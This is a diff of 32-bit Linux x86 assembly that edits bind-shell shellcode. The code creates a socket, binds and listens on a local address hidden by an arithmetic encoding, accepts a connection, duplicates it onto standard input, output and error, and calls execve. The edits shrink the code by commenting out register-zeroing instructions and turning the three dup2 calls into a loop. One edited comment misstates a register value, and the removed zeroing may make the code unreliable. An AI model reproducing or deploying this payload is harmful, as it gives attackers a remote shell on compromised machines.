@@ -22,14 +22,14 @@ _start:
 	push 0x20676e69
 	push 0x646e6942
 	mov ecx,esp  		; $ecx = Address of stack, containing the message
-	xor edx, edx		; $edx = 0
+	xor edx, edx		; $edx = 0x10
 	mov dl, 0x10 		; Message length (4*4=16)
 	int 0x80
 
 	; Socket - 359
-	xor eax, eax
+	;xor eax, eax
 	mov ax, 0x167		; Syscall 359 = Socket
-	xor ebx, ebx
+	;xor ebx, ebx
 	mov bl, 2 		; $ebx = Domain = 2 [AF_INET]
 	xor ecx, ecx
 	mov cl, 1 		; $ecx = Type = 1 [SOCK_STREAM]
@@ -38,10 +38,10 @@ _start:
 	push eax 			; File descriptor gets pushed to stack
 
 	; Bind - 361
-	xor eax, eax
+	;xor eax, eax
 	mov ax, 0x169 		; Syscall 361 = Bind
 	pop ebx 			; $ebx = File descriptor stored in stack / returned by socket syscall
-	xor edx, edx		
+	;xor edx, edx		
 	xor edi, edi 			; edi is 0
 	mov edi, 0x12111190 	; 0x12111190 = 0x100007F + 0x11111111
 	sub edi, 0x11111111 	; 0x11111111 is an aux value. It can change to 0x22222222, 0x33333333 with the Python wrapper if IP+0x11111111 has NOPs
@@ -54,7 +54,7 @@ _start:
 	int 0x80
 
 	; Listen - 363
-	xor eax, eax
+	;xor eax, eax
 	mov ax, 0x16b 		; Syscall 363 = Listen
 	;pop ebx				; $ebx = File descriptor address
 	;push ebx			; It gets pushed again
@@ -62,43 +62,25 @@ _start:
 	int 0x80
 
 	; Accept - 364
-	xor eax, eax
+	;xor eax, eax
 	mov ax, 0x16c 		; Syscall 364 = Accept
 	;pop ebx 			; $ebx = File descriptor address
-	xor ecx, ecx 		; $ecx = addr = 0, local address
-	xor edx, edx
-	xor esi, esi
+	;xor ecx, ecx 		; $ecx = addr = 0, local address
+	;xor edx, edx
 	;mov dl, 0x10 		; $edx = Address length is 16 bits 
 	int 0x80
 	;push eax			; New file descriptor gets pushed to stack
 
-
-	;dup2 - 0
+	;dup2 - 2,1,0
 	mov ebx, eax		; $ebx = File descriptor address
+	;xor ecx, ecx 		; $ecx = New file descriptor = 2, 1 and 0
+	mov cl, 3
+bucle:
 	xor eax, eax
 	mov al, 0x3f  		; Syscall is 63 = Dup2
-	;pop ebx 
-	push ebx 			
-	xor ecx, ecx 		; $ecx = New file descriptor = 0
 	int 0x80
-
-	;dup2 - 1
-	xor eax, eax
-	mov al, 0x3f  		; Syscall is 63 = Dup2
-	pop ebx
-	push ebx 			; $ebx = File descriptor address
-	xor ecx, ecx
-	mov cl, 1 			; $ecx = New file descriptor = 1
-	int 0x80
-
-	;dup2 - 2
-	xor eax, eax
-	mov al, 0x3f 		; Syscall is 63 = Dup2
-	push ebx 			; $ebx = File descriptor address
-	xor ecx, ecx
-	mov cl, 2 	 		; $ecx = New file descriptor = 2
-	int 0x80
-	
+	dec ecx
+	jns bucle
 
 	; Execve
 	xor eax, eax
